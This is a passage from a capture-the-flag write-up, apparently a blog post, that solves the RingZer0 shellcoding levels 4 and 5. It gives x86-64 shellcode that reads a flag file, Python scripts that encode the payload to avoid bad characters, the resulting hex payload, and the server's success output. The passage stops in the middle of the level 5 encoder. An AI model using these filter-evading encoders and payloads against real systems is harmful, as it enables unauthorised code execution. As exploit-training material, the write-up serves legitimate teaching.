<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>push byte <span class="m">0</span>         <span class="p">;</span> we can use <span class="m">0</span> here because we add <span class="m">1</span> to each
</span><span class='line'>                    <span class="p">;</span> byte in the shellcode to <span class="s1">&#39;encode&#39;</span> it.
</span><span class='line'>pop rbx             <span class="p">;</span> store this value in rbx. We<span class="s1">&#39;ll re-use it later.</span>
</span><span class='line'><span class="s1">push rbx            ; copy rbx...</span>
</span><span class='line'><span class="s1">pop rax             ; ...to rax. rax is now 0, the syscall for &#39;</span><span class="nb">read</span><span class="err">&#39;</span>
</span><span class='line'>push rbx            <span class="p">;</span> copy rbx...
</span><span class='line'>pop rdi             <span class="p">;</span> ...to rdi: <span class="nv">fd</span> <span class="o">=</span> stdin
</span><span class='line'>push rsp            <span class="p">;</span> copy rsp to rsi
</span><span class='line'>pop rsi             <span class="p">;</span> rsi is the buffer to which we <span class="nb">read </span>the filename to open
</span><span class='line'>
</span><span class='line'>push byte <span class="m">18</span>        <span class="p">;</span> the filename will be <span class="m">18</span> bytes long
</span><span class='line'>pop rdx             <span class="p">;</span> amount of byte to <span class="nb">read</span>
</span><span class='line'>syscall             <span class="p">;</span> <span class="nb">read </span>in the filename
</span><span class='line'>
</span><span class='line'>push rbx            <span class="p">;</span> rbx is still 0
</span><span class='line'>pop rax             <span class="p">;</span> zero out rax
</span><span class='line'>xor al, <span class="m">2</span>           <span class="p">;</span> syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
</span><span class='line'>push rdi            <span class="p">;</span> switch around some registers. <span class="nv">rdi</span> <span class="o">=</span> 0
</span><span class='line'>push rsi            <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> pointer to filename
</span><span class='line'>pop rdi             <span class="p">;</span> rdi now points to filename to open
</span><span class='line'>pop rsi             <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> 0, which is O_RDONLY
</span><span class='line'>syscall             <span class="p">;</span> open file
</span><span class='line'>
</span><span class='line'>                    <span class="p">;</span> switch around the registers again.
</span><span class='line'>                    <span class="p">;</span> have to use the push/pops, because <span class="sb">`</span>xchg<span class="sb">`</span> would generate a badchar after encoding.
</span><span class='line'>push rax            <span class="p">;</span> filehandle of just opened file
</span><span class='line'>push rsi            <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> 0
</span><span class='line'>push rdi            <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> pointer to top of stack
</span><span class='line'>pop rsi             <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> buf
</span><span class='line'>pop rax             <span class="p">;</span> <span class="nv">rax</span> <span class="o">=</span> <span class="m">0</span> <span class="o">(</span>syscall <span class="nb">read</span><span class="o">)</span>
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> filehandle
</span><span class='line'>push byte <span class="m">127</span>       <span class="p">;</span> amount of bytes to <span class="nb">read</span>
</span><span class='line'>pop rdx             <span class="p">;</span> in rdx
</span><span class='line'>syscall             <span class="p">;</span> <span class="nb">read </span>in the contents of the file
</span><span class='line'>
</span><span class='line'>push rbx            <span class="p">;</span> rbx is still 0
</span><span class='line'>pop rax             <span class="p">;</span> zero out rax
</span><span class='line'>xor al, <span class="m">1</span>           <span class="p">;</span> syscall write
</span><span class='line'>push rax            <span class="p">;</span> copy rax to rdi
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">filehandle</span> <span class="o">=</span> <span class="m">0</span> <span class="o">(</span>stdout<span class="o">)</span>
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointer to buffer
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall             <span class="p">;</span> write to stdout<span class="p">;</span> get me the flag!
</span><span class='line'>ret                 <span class="p">;</span> <span class="k">return</span> to handler program
</span></code></pre></td></tr></table></div></figure>


<p>Now, I could assemble these two shellcode pieces with <code>nasm</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nasm -f bin ./decoder.asm
</span><span class='line'><span class="nv">$ </span>nasm -f bin ./shellcode.asm
</span></code></pre></td></tr></table></div></figure>


<p>Then I wrote a small python program to do the actual encoding of the shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the decoder</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;decoder&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">decoder</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x</span><span class="si">%02x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="n">decoder</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the shellcode &amp; encode it</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">sc</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="c"># for each byte, we add 1 to it and emit it.</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x</span><span class="si">%02x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># spit out payload!</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running this python script, I ended up with the completed shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="o">./</span><span class="n">encode</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'>\<span class="n">x4c</span>\<span class="n">x8d</span>\<span class="n">x35</span>\<span class="n">x8b</span>\<span class="n">x56</span>\<span class="n">x34</span>\<span class="n">x12</span>\<span class="n">x49</span>\<span class="n">x81</span>\<span class="n">xee</span>\<span class="n">x78</span>\<span class="n">x56</span>\<span class="n">x34</span>\<span class="n">x12</span>\<span class="n">x6a</span>\<span class="n">x2b</span>\<span class="n">x59</span>\<span class="n">x41</span>\<span class="n">xfe</span>\<span class="n">x0e</span>\<span class="n">x49</span>\<span class="n">x83</span>\<span class="n">xc6</span>\<span class="n">x01</span>\<span class="n">xe2</span>\<span class="n">xf7</span>\<span class="n">x6b</span>\<span class="n">x01</span>\<span class="n">x5c</span>\<span class="n">x54</span>\<span class="n">x59</span>\<span class="n">x54</span>\<span class="n">x60</span>\<span class="n">x55</span>\<span class="n">x5f</span>\<span class="n">x6b</span>\<span class="n">x13</span>\<span class="n">x5b</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">x54</span>\<span class="n">x59</span>\<span class="n">x35</span>\<span class="n">x03</span>\<span class="n">x58</span>\<span class="n">x57</span>\<span class="n">x60</span>\<span class="n">x5f</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">x51</span>\<span class="n">x57</span>\<span class="n">x58</span>\<span class="n">x5f</span>\<span class="n">x59</span>\<span class="n">x60</span>\<span class="n">x6b</span>\<span class="n">x80</span>\<span class="n">x5b</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">x54</span>\<span class="n">x59</span>\<span class="n">x35</span>\<span class="n">x02</span>\<span class="n">x51</span>\<span class="n">x60</span>\<span class="n">x10</span>\<span class="n">x06</span>\<span class="n">xc4</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, there are no badchars in this shellcode. We can send it over and grab the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RingZer0 Team CTF Shellcoding Level 4
</span><span class='line'>Submit your shellcode using hex representation <span class="s2">&quot;\xcc\xcd&quot;</span>.
</span><span class='line'>Type <span class="s2">&quot;end&quot;</span> to exit.
</span><span class='line'>
</span><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x48&quot;</span> max size <span class="m">80</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level4.flag
</span><span class='line'>
</span><span class='line'>shellcode&gt;<span class="se">\x</span>4c<span class="se">\x</span>8d<span class="se">\x</span>35<span class="se">\x</span>8b<span class="se">\x</span>56<span class="se">\x</span>34<span class="se">\x</span>12<span class="se">\x</span>49<span class="se">\x</span>81<span class="se">\x</span>ee<span class="se">\x</span>78<span class="se">\x</span>56<span class="se">\x</span>34<span class="se">\x</span>12<span class="se">\x</span>6a<span class="se">\x</span>2b<span class="se">\x</span>59<span class="se">\x</span>41<span class="se">\x</span>fe<span class="se">\x</span>0e<span class="se">\x</span>49<span class="se">\x</span>83<span class="se">\x</span>c6<span class="se">\x</span>01<span class="se">\x</span>e2<span class="se">\x</span>f7<span class="se">\x</span>6b<span class="se">\x</span>01<span class="se">\x</span>5c<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>54<span class="se">\x</span>60<span class="se">\x</span>55<span class="se">\x</span>5f<span class="se">\x</span>6b<span class="se">\x</span>13<span class="se">\x</span>5b<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>35<span class="se">\x</span>03<span class="se">\x</span>58<span class="se">\x</span>57<span class="se">\x</span>60<span class="se">\x</span>5f<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>51<span class="se">\x</span>57<span class="se">\x</span>58<span class="se">\x</span>5f<span class="se">\x</span>59<span class="se">\x</span>60<span class="se">\x</span>6b<span class="se">\x</span>80<span class="se">\x</span>5b<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>54<span class="se">\x</span>59<span class="se">\x</span>35<span class="se">\x</span>02<span class="se">\x</span>51<span class="se">\x</span>60<span class="se">\x</span>10<span class="se">\x</span>06<span class="se">\x</span>c4
</span><span class='line'>  Shellcode received...
</span><span class='line'>  Shellcode length <span class="o">(</span>70<span class="o">)</span> bytes.
</span><span class='line'>
</span><span class='line'>  Success: Executing shellcode...
</span><span class='line'>
</span><span class='line'>/flag/level4.flag^@
</span><span class='line'>FLAG-&lt;redacted&gt;
</span><span class='line'>Connection to shellcode.ringzer0team.com closed.
</span></code></pre></td></tr></table></div></figure>


<h2>Level 5</h2>

<p>Of course, level 5 increases the bad char list even further&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x68&quot;</span> and <span class="se">\x</span><span class="m">40</span> to <span class="se">\x</span><span class="m">65</span> max size <span class="m">100</span> bytes.
</span></code></pre></td></tr></table></div></figure>


<p>We can no longer use the relative addressing with <code>lea</code>, because of the bad chars <code>0x49</code> and <code>0x48</code>. In fact, I was unable to get the address of the shellcode via any techniques I know.</p>

<p>I assumed that this shellcode is being executed via a instruction like <code>call rax</code>. That means that <code>rax</code> would still contain the pointer to the shellcode. If this is the case, we can re-use the value in <code>rax</code> as an index to the shellcode and use it to carve out the &lsquo;real&rsquo; shellcode via <code>xor</code> instructions. But let&rsquo;s first test this hypothesis. Time to get creative!</p>

<p>I made a small piece of shellcode that tests this hypothesis:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>default rel
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>xor dword <span class="o">[</span>rax+_temp-_start<span class="o">]</span>, 0x3d283d28        <span class="p">;</span> the xor will change the rets to jmp <span class="nv">$-</span>2!
</span><span class='line'>
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>nop
</span><span class='line'>
</span><span class='line'>_temp:
</span><span class='line'>ret
</span><span class='line'>ret
</span><span class='line'>ret
</span><span class='line'>ret
</span></code></pre></td></tr></table></div></figure>


<p>When this code executes, the <code>xor</code> instruction should change the <code>ret</code> instructions to <code>jmp $-2</code>, or infinite loops (this works, because <code>c3 c3 c3 c3 xor 28 3d 28 3d</code> translates to <code>eb fe eb fe</code>). If <code>rax</code> does not point to the shellcode, I might get a SIGSEGV or the code simply exits.</p>

<p>Compiling it and sending it over, however, makes the program hang! This must means that the <code>ret</code>s were changed into <code>jmp</code> instructions, proving the hypothesis. We can use <code>rax</code> as a pointer to the shellcode! Now, we need to carve out the actual shellcode and execute it. I chose to use the same <code>xor</code> strategy. I made the <code>read/open/read/write</code> shellcode a lot smaller, managing to bring it down to 31 bytes. It contains bad chars again, but that&rsquo;s okay because I&rsquo;m gonna encode it anyway:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>xor rax, rax        <span class="p">;</span> syscall <span class="nb">read</span>
</span><span class='line'>push rax
</span><span class='line'>pop rdi             <span class="p">;</span> rdi: <span class="nv">fd</span> <span class="o">=</span> stdin
</span><span class='line'>push rsp
</span><span class='line'>pop rsi             <span class="p">;</span> rsi points to stack, aka a buffer
</span><span class='line'>push byte 127
</span><span class='line'>pop rdx             <span class="p">;</span> <span class="nb">read </span><span class="m">127</span> bytes
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>mov al, <span class="m">2</span>           <span class="p">;</span> open<span class="p">;</span> because we <span class="nb">read </span>less than <span class="m">128</span> bytes, the rest of rax/eax/ax/ah will contain zeroes.
</span><span class='line'>xchg rsi, rdi       <span class="p">;</span> rsi is now zero <span class="o">(</span>O_RDONLY<span class="o">)</span> and rdi points to the filename on the stack
</span><span class='line'>syscall             <span class="p">;</span> open the file
</span><span class='line'>
</span><span class='line'>xchg rax, rdi       <span class="p">;</span> after this, <span class="nv">rax</span> <span class="o">=</span> pointer to the stack, <span class="nv">rdi</span> <span class="o">=</span> filehandle
</span><span class='line'>xchg rax, rsi       <span class="p">;</span> after this, <span class="nv">rax</span> <span class="o">=</span> 0, <span class="nv">rsi</span> <span class="o">=</span> pointer to the stack
</span><span class='line'>syscall             <span class="p">;</span> <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>mov al, <span class="m">1</span>           <span class="p">;</span> again, less than <span class="m">128</span> bytes will be <span class="nb">read</span>
</span><span class='line'>push rax
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">fd</span> <span class="o">=</span> stdout
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointer to buffer
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall             <span class="p">;</span> write out contents of flag to stdout!
</span></code></pre></td></tr></table></div></figure>


<p>Next, I needed to carve out this shellcode using <code>xor</code> instructions. These instructions must not contain bad chars. Luckily, <code>xor dword ptr [rax+offset]</code> itself does not contain bad chars, or they can be avoided.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39; this function will try to locate a combination of two bytes that, when</span>
</span><span class='line'><span class="sd">    xor&#39;ed, yield the required byte.</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="k">def</span> <span class="nf">find_xor_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>          <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>              <span class="c"># return the two bytes that encode the required byte</span>
</span><span class='line'>              <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;cannot find proper byte for {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># build the bad char lookup array.</span>
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">]</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="c"># I got a bit paranoid and decided that these bytes were badchars too</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># read in the shellcode that we need to encode.</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;modified-shellcode3&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">sc</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">sc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pad out the shellcode to a multiple of four</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc3</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ill-named variables to hold the encrypted bytes</span>
</span><span class='line'><span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">commands</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">defines</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">num_commands</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="c"># iterate over each byte in the shellcode</span>
</span><span class='line'><span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="c"># try to find two bytes that are not badchars themselves</span>
</span><span class='line'>  <span class="p">(</span><span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">)</span> <span class="o">=</span> <span class="n">find_xor_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># store those bytes</span>
</span><span class='line'>  <span class="n">storage</span> <span class="o">+=</span> <span class="n">b1</span>
</span><span class='line'>  <span class="n">encoded_bytes</span> <span class="o">+=</span> <span class="n">b2</span>
</span><span class='line'>  <span class="c"># if there are four bytes stored, add them to the output &amp; start again</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">storage</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>      <span class="c"># emit </span>
</span><span class='line'>      <span class="n">commands</span> <span class="o">+=</span> <span class="s">&quot;xor dword [rax+_shellcode{}-_shellcode], {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">storage</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">defines</span> <span class="o">+=</span> <span class="s">&quot;_shellcode{} dd {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">encoded_bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">num_commands</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>              
</span><span class='line'><span class="c"># output the resulting assembly   </span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;bits 64</span>
</span><span class='line'><span class="s">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="s">;mov rax, 10</span>
</span><span class='line'><span class="s">;mov rdi, 0x400000</span>
